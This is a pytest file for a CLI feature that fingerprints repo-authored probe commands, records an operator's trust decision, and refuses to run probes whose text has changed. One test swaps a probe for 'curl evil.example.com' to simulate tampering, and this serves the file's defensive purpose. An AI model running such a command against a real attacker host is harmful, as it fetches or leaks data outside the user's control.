"""Probe trust (spec 2026-10-22-fr-ops R19, p1-r5).

Probes are repo-authored code. `fr ops trust` shows every probe and command text
and, on a terminal confirmation, records an `op-trust-<n>` decision holding the
SHA-256 of the canonical op set (and each op's own hash, so a later refusal can
say what changed). `fr ops status` runs no probe while the current set differs.
"""

from __future__ import annotations

import subprocess
from pathlib import Path

from fr.cli import app
from fr.commands import ops_cmd
from fr.journal.model import journal_path, parse_journal
from fr.ops.load import LoadedOp, OpsConfig, load_ops
from fr.ops.model import Op
from fr.ops.trust import diff, fingerprint, latest_trust, record_trust, set_hash
from typer.testing import CliRunner

runner = CliRunner()
PLAN_REL = "docs/superpowers/plans/p"
OPS = """schema_version: 1
ops:
  - id: create-key
    summary: Create the deploy key
    phase: pre-merge
    check: 'true'
  - id: rotate
    summary: Rotate the token
    phase: post-merge
    check: 'touch probe-ran; true'
    identities: [admin]
"""
CONFIG = "identities:\n  admin:\n    env:\n      TOKEN: {from: 'echo tok'}\n"


def _repo(tmp_path: Path) -> Path:
    subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
    plan = tmp_path / PLAN_REL
    plan.mkdir(parents=True)
    (plan / "ops.yaml").write_text(OPS)
    (tmp_path / ".fr").mkdir()
    (tmp_path / ".fr/ops.yaml").write_text(CONFIG)
    return tmp_path


def _lo(**fields: object) -> LoadedOp:
    data: dict[str, object] = {"id": "a", "summary": "s", "phase": "pre-merge", "check": "true"}
    data.update(fields)
    return LoadedOp(Op.model_validate(data), Path("ops.yaml"), 1)


# --- the fingerprint ---------------------------------------------------------------


def test_the_fingerprint_is_stable_and_moves_with_any_probe_text() -> None:
    config = OpsConfig()
    one = fingerprint([_lo(), _lo(id="b")], config)
    assert one == fingerprint([_lo(id="b"), _lo()], config)  # order-free
    assert set_hash(one) == set_hash(dict(reversed(list(one.items()))))
    assert fingerprint([_lo(check="false"), _lo(id="b")], config)["a"] != one["a"]


def test_the_fingerprint_covers_an_identitys_from_command() -> None:
    def cfg(cmd: str) -> OpsConfig:
        return OpsConfig.model_validate({"identities": {"x": {"env": {"T": {"from": cmd}}}}})

    ops = [_lo(identities=["x"])]
    assert fingerprint(ops, cfg("echo a")) != fingerprint(ops, cfg("echo b"))
    assert "identity:x" in fingerprint(ops, cfg("echo a"))


def test_diff_names_added_changed_and_removed() -> None:
    config = OpsConfig()
    trusted_fp = fingerprint([_lo(), _lo(id="b")], config)
    now = fingerprint([_lo(check="false"), _lo(id="c")], config)
    from fr.ops.trust import Trusted

    d = diff(now, Trusted(sha256=set_hash(trusted_fp), ops=trusted_fp, entry_id="op-trust-1"))
    assert (d.added, d.changed, d.removed) == (["c"], ["a"], ["b"])
    assert not diff(trusted_fp, Trusted(set_hash(trusted_fp), trusted_fp, "op-trust-1")).untrusted
    assert diff(now, None).added == sorted(now)


def test_record_trust_writes_an_incrementing_decision_and_reads_back(tmp_path: Path) -> None:
    root = _repo(tmp_path)
    fp = fingerprint(load_ops(root / PLAN_REL, root).ops, OpsConfig())
    first = record_trust(root, "p", fp)
    second = record_trust(root, "p", {**fp, "x": "0" * 64})
    assert (first.id, second.id) == ("op-trust-1", "op-trust-2")
    assert first.kind == "decision" and first.decided_by == "operator"
    assert f"sha256: {set_hash(fp)}" in first.body
    entries = parse_journal(journal_path(root, "plan", "p").read_text())
    trusted = latest_trust(entries)
    assert trusted is not None and trusted.entry_id == "op-trust-2" and "x" in trusted.ops


# --- the CLI ---------------------------------------------------------------------


def _trust(root: Path, monkeypatch, answer: str = "y\n", interactive: bool = True):
    monkeypatch.chdir(root)
    monkeypatch.setattr(ops_cmd, "_interactive", lambda: interactive)
    return runner.invoke(app, ["ops", "trust", "--plan", PLAN_REL], input=answer)


def test_trust_shows_every_probe_and_command_and_records_on_yes(
    tmp_path: Path, monkeypatch
) -> None:
    root = _repo(tmp_path)
    result = _trust(root, monkeypatch)
    assert result.exit_code == 0, result.output
    assert "touch probe-ran; true" in result.stdout
    assert "echo tok" in result.stdout  # the identity's from: command
    assert "op-trust-1" in result.stdout
    assert "op-trust-1" in journal_path(root, "plan", "p").read_text()


def test_trust_refuses_without_a_terminal(tmp_path: Path, monkeypatch) -> None:
    root = _repo(tmp_path)
    result = _trust(root, monkeypatch, interactive=False)
    assert result.exit_code == 2
    assert "terminal" in result.output
    assert not journal_path(root, "plan", "p").exists()


def test_trust_declined_writes_nothing(tmp_path: Path, monkeypatch) -> None:
    root = _repo(tmp_path)
    result = _trust(root, monkeypatch, answer="n\n")
    assert result.exit_code == 1
    assert not journal_path(root, "plan", "p").exists()


def test_trusting_an_already_trusted_set_writes_nothing(tmp_path: Path, monkeypatch) -> None:
    root = _repo(tmp_path)
    _trust(root, monkeypatch)
    before = journal_path(root, "plan", "p").read_text()
    again = _trust(root, monkeypatch)
    assert again.exit_code == 0 and "already trusted" in again.stdout
    assert journal_path(root, "plan", "p").read_text() == before


def _status(root: Path, monkeypatch):
    monkeypatch.chdir(root)
    return runner.invoke(app, ["ops", "status", "--plan", PLAN_REL])


def test_status_refuses_an_untrusted_set_and_runs_no_probe(tmp_path: Path, monkeypatch) -> None:
    root = _repo(tmp_path)
    result = _status(root, monkeypatch)
    assert result.exit_code == 2
    assert "fr ops trust" in result.output
    assert "create-key" in result.output and "rotate" in result.output
    assert not (root / "probe-ran").exists()


def test_status_runs_once_trusted(tmp_path: Path, monkeypatch) -> None:
    root = _repo(tmp_path)
    _trust(root, monkeypatch)
    result = _status(root, monkeypatch)
    assert result.exit_code == 0, result.output
    assert (root / "probe-ran").exists()


def test_status_refuses_after_a_probe_changes_and_names_it(tmp_path: Path, monkeypatch) -> None:
    root = _repo(tmp_path)
    _trust(root, monkeypatch)
    ops = root / PLAN_REL / "ops.yaml"
    ops.write_text(ops.read_text().replace("touch probe-ran; true", "curl evil.example.com"))
    result = _status(root, monkeypatch)
    assert result.exit_code == 2
    assert "changed: rotate" in result.output
    assert "create-key" not in result.output.split("changed:")[1]


def test_no_help_text_calls_a_probe_read_only() -> None:
    for args in (["ops", "--help"], ["ops", "status", "--help"], ["ops", "trust", "--help"]):
        out = runner.invoke(app, args).output.lower()
        assert "read-only" not in out and "reads only" not in out, args
